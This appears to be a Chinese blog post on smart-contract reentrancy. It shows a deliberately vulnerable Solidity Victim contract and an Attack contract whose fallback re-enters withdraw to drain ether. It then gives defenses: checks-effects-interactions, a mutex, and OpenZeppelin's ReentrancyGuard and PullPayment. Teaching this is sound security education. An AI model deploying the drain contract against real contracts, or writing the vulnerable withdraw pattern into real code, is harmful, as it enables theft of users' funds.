[{"title":"智能合约重入漏洞","url":"/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/","content":"智能合约重⼊漏洞原理分析外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。\nfunction withdraw(uint _amount) public &#123;\trequire(balances[msg.sender] &gt;= _amount)\tmsg.sender.call.value(_amount)();\tbalances[msg.sender] -= _amount;&#125;\n\n\n其中，fallback函数是关键\nfallback函数当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，fallback 函数就会被调用。\n向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。\n而fallback函数是可以被重写的\n如果构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）\n漏洞demopragma solidity ^0.6.10;contract Victim &#123;\tmapping(address =&gt; uint) public balances;\taddress public owner;        //构造函数，设定合约所有者    constructor() public &#123;        owner = msg.sender;    &#125;\t\t//接收资金转入\tfunction deposit() public payable &#123;\t\tbalances[msg.sender] += msg.value;\t&#125;\t\t//提款\tfunction withdraw(uint _amount) public &#123;\t\trequire(balances[msg.sender] &gt;= _amount);\t\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\t\tbalances[msg.sender] -= _amount;\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n攻击合约contract Attack &#123;\tVictim public victim;\t\t//设定受害者合约地址\tconstructor(address _victimAddress) public &#123;\t\tvictim = Victim(_victimAddress);\t&#125;\t\t//重写fallback\tfallback() external payable &#123;\t\tif(address(victim).balance &gt;= 1 ether)&#123;\t\t\tvictim.withdraw(1 ether);\t\t&#125;\t&#125;\t\t//攻击，调用受害者的withdraw函数\tfunction attack() external payable &#123;\t\trequire(msg.value &gt;= 1 ether);\t\tvictim.deposit&#123;value: 1 ether&#125;();\t\tvictim.withdraw(1 ether);\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n复现过程虚拟机中\n分别为受害者和攻击者创建一个合约\n\n\n\n用deposit函数为受害者设定一定余额\n\n\n\n检查受害者余额\n\n\n\n进行攻击\n\n\n\n检查攻击者和受害者的余额\n\n\n\n测试链上\n部署受害者合约\n\n\n\n部署攻击者合约\n\n\n为受害者合约打入2eth\n\n\n\n\n攻击\n\n\n\n结果\n\n\n\n\n规避建议方法一总是用 send()或transfer() 来发送 ether，而不是用 call.value()。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。\n方法二确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）\n第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。\n第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。\n第三步，与其它合约的交互应该是任何函数的最后一步。\nrequire(balances[msg.sender] &gt; amount); //检查require(this.balance &gt; amount); //检查balances[msg.sender] -= amount; // 生效to.call.value(amount)();  // 交互\n\n方法三\n使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用\n\nbool reEntrancyMutex = false;function withdraw(uint _amount) public &#123;\trequire(!reEntrancyMutex);\treEntrancyMutex = true;\trequire(balances[msg.sender] &gt;= _amount);\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\tbalances[msg.sender] -= _amount;\treEntrancyMutex = false;&#125;\n\n\n使用OpenZeppelin官方的ReentrancyGuard合约的nonReentrant modifier。\n\n在函数中增加nonReentrant modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。\n当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加nonReentrant modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)pragma solidity ^0.8.0;/** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */abstract contract ReentrancyGuard &#123;    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler&#x27;s defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    // The values being non-zero value makes deployment a bit more expensive,    // but in exchange the refund on every call to nonReentrant will be lower in    // amount. Since refunds are capped to a percentage of the total    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to    // increase the likelihood of the full refund coming into effect.    uint256 private constant _NOT_ENTERED = 1;    uint256 private constant _ENTERED = 2;    uint256 private _status;    constructor() &#123;        _status = _NOT_ENTERED;    &#125;    /**     * @dev Prevents a contract from calling itself, directly or indirectly.     * Calling a `nonReentrant` function from another `nonReentrant`     * function is not supported. It is possible to prevent this from happening     * by making the `nonReentrant` function external, and making it call a     * `private` function that does the actual work.     */    modifier nonReentrant() &#123;        // On the first call to nonReentrant, _notEntered will be true        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);        // Any calls to nonReentrant after this point will fail        _status = _ENTERED;        _;        // By storing the original value once again, a refund is triggered (see        // https://eips.ethereum.org/EIPS/eip-2200)        _status = _NOT_ENTERED;    &#125;&#125;\n\n\n使用采用pull payment模式，OpenZeppelin提供了PullPayment合约。\n\n其提供了_asyncTransfer函数，与transfer类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：withdrawPayments。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)pragma solidity ^0.8.0;import &quot;../utils/escrow/Escrow.sol&quot;;/** * @dev Simple implementation of a * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment] * strategy, where the paying contract doesn&#x27;t interact directly with the * receiver account, which must withdraw its payments itself. * * Pull-payments are often considered the best practice when it comes to sending * Ether, security-wise. It prevents recipients from blocking execution, and * eliminates reentrancy concerns. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. * * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125; * instead of Solidity&#x27;s `transfer` function. Payees can query their due * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;. */abstract contract PullPayment &#123;    Escrow private immutable _escrow;    constructor() &#123;        _escrow = new Escrow();    &#125;    /**     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.     *     * Note that _any_ account can call this function, not just the `payee`.     * This means that contracts unaware of the `PullPayment` protocol can still     * receive funds this way, by having a separate account call     * &#123;withdrawPayments&#125;.     *     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.     * Make sure you trust the recipient, or are either following the     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.     *     * @param payee Whose payments will be withdrawn.     */    function withdrawPayments(address payable payee) public virtual &#123;        _escrow.withdraw(payee);    &#125;    /**     * @dev Returns the payments owed to an address.     * @param dest The creditor&#x27;s address.     */    function payments(address dest) public view returns (uint256) &#123;        return _escrow.depositsOf(dest);    &#125;    /**     * @dev Called by the payer to store the sent amount as credit to be pulled.     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so     * there is no danger of them being spent before withdrawal.     *     * @param dest The destination address of the funds.     * @param amount The amount to transfer.     */    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;        _escrow.deposit&#123;value: amount&#125;(dest);    &#125;&#125;\n\n","tags":["智能合约","漏洞"]}]